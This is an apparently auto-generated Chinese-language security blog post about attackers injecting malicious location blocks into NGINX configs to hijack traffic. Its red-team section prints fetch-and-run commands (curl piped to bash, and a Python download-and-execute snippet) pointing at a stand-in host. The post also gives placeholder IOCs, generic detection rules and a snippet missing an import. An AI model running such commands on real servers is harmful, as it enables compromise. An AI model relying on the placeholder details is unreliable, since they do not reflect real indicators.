---
layout: post
title:  "Hackers compromise NGINX servers to redirect user traffic"
date:   2026-02-05 01:23:54 +0000
categories: [security]
severity: high
---

# 🔥 NGINX 伺服器流量劫持攻擊：解析與防禦
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Traffic Hijacking
> * **關鍵技術**: NGINX 配置檔案注入、流量重導向、命令與控制（C2）通訊

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者通過修改 NGINX 配置檔案，注入惡意的 `location` 區塊，捕獲來自用戶的請求，並將其重導向攻擊者的後端基礎設施。
* **攻擊流程圖解**:
  1. 攻擊者首先使用 `zx.sh` 腳本下載並執行後續的攻擊階段。
  2. `bt.sh` 腳本修改 NGINX 配置檔案，注入惡意的 `location` 區塊。
  3. `4zdh.sh` 腳本枚舉常見的 NGINX 配置檔案位置，使用 `csplit` 和 `awk` 工具防止配置檔案損壞。
  4. `zdh.sh` 腳本使用更狹窄的目標方法，主要針對 `/etc/nginx/sites-enabled` 目錄。
  5. `ok.sh` 腳本掃描受損的 NGINX 配置檔案，建立被劫持的域名、注入模板和代理目標的映射，並將收集的數據傳輸到 C2 伺服器。
* **受影響元件**: NGINX 伺服器，特別是使用 Baota 主機管理面板的伺服器。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要對目標 NGINX 伺服器具有寫入配置檔案的權限。
* **Payload 建構邏輯**:

    ```
    
    bash
      # 範例指令：使用 curl 下載並執行 zx.sh 腳本
      curl -s http://example.com/zx.sh | bash
    
    ```
 

```

python
  # 範例 Payload 結構：使用 Python 腳本注入惡意的 location 區塊
  import requests

  # 下載並執行 bt.sh 腳本
  response = requests.get('http://example.com/bt.sh')
  with open('bt.sh', 'wb') as f:
      f.write(response.content)
  subprocess.run(['bash', 'bt.sh'])

```
* **繞過技術**: 攻擊者可以使用各種技術繞過安全防護，例如使用加密通訊、隱藏惡意代碼等。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 158.94.210.227 | example.com | /etc/nginx/sites-enabled/default |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule NGINX_Config_Injection {
        meta:
          description = "NGINX 配置檔案注入惡意代碼"
          author = "Your Name"
        strings:
          $a = "location / {"
          $b = "proxy_pass http://example.com;"
        condition:
          $a and $b
      }
    
    ```
 

```

snort
  alert tcp any any -> any 80 (msg:"NGINX 配置檔案注入惡意代碼"; content:"location / {"; content:"proxy_pass http://example.com;";)

```
* **緩解措施**: 更新 NGINX 伺服器，限制配置檔案的寫入權限，監控配置檔案的變化，使用安全的通訊協議等。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **NGINX**: 一種開源的 Web 伺服器軟體，常用於 Web 伺服器、負載平衡、快取和反向代理等。
* **配置檔案注入**: 一種攻擊技術，通過修改配置檔案注入惡意代碼，實現流量重導向等攻擊。
* **命令與控制（C2）通訊**: 攻擊者與受損主機之間的通訊，用于下達命令、傳輸數據等。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-compromise-nginx-servers-to-redirect-user-traffic/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


